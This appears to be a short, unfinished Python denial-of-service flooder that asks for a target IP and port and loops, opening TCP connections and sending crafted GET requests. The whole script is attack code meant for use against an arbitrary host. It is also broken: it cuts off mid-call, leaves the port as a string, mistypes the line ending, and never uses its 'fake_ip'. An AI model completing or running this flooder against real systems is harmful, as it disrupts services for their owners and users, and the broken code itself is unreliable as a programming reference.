import threading
import socket

# Targets ip addres
target = input('ip: ')
# Targets port
port = input('port: ')
fake_ip = '182.43.0.90'

def attack():
    while True:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((target, port))
     s.sendto(('get /' + target + ' http/1.1\r\m').encode('ascii'),(target, port))
     s.sendto
